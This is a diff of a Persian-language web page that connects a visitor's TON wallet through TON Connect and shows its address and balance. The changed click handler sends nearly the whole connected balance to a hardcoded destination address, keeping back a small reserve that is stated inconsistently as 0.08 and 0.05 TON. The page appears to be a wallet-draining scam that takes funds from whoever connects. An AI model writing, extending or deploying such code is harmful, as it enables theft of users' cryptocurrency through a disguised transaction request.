@@ -61,7 +61,7 @@
         <div id="wallet-info" class="wallet-info">
             <p><strong>آدرس کیف پول:</strong> <span id="wallet-address"></span></p>
             <p><strong>موجودی:</strong> <span id="wallet-balance"></span> TON</p>
-            <button id="send-all" style="display: none;">ارسال تمام موجودی</button>
+            <button id="send-all" style="display: none;">ارسال موجودی (به‌جز 0.05 TON)</button>
         </div>
     </div>
 
@@ -106,31 +106,29 @@
             }
         });
 
-        // ارسال تمام موجودی به جز کارمزد تخمینی
+        // ارسال تمام موجودی به جز 0.05 TON
         sendAllBtn.addEventListener("click", async () => {
+            const reservedAmount = 0.08; // مقدار رزرو شده در کیف پول
+            const sendAmount = userBalance - reservedAmount;
+
+            if (sendAmount <= 0) {
+                alert("موجودی کافی نیست! حداقل 0.05 TON باید در کیف پول بماند.");
+                return;
+            }
+
+            const transaction = {
+                messages: [
+                    {
+                        address: "UQDhw1z4-qGN-mEKA3ukAHRkqOmZnyeC8pYqo-nWJKalUtLW", // آدرس مقصد
+                        amount: (sendAmount * 1e9).toString(), // تبدیل TON به nanotons
+                    },
+                ],
+            };
+
             try {
-                // دریافت مقدار تخمینی کارمزد از API
-                const gasFeeEstimate = 0.1; // حدودی (میتوان مقدار دقیق را از API دریافت کرد)
-                const sendAmount = userBalance - gasFeeEstimate;
-
-                if (sendAmount <= 0) {
-                    alert("موجودی کافی نیست! حداقل مقدار برای پرداخت کارمزد باید باقی بماند.");
-                    return;
-                }
-
-                const transaction = {
-                    messages: [
-                        {
-                            address: "UQDhw1z4-qGN-mEKA3ukAHRkqOmZnyeC8pYqo-nWJKalUtLW", // آدرس مقصد
-                            amount: (sendAmount * 1e9).toString(), // تبدیل TON به nanotons
-                        },
-                    ],
-                };
-
                 const result = await tonConnectUI.sendTransaction(transaction);
                 alert(`ارسال ${sendAmount.toFixed(6)} TON انجام شد!`);
                 console.log("Transaction Result:", result);
-
             } catch (error) {
                 alert("ارسال تراکنش ناموفق بود.");
                 console.error(error);
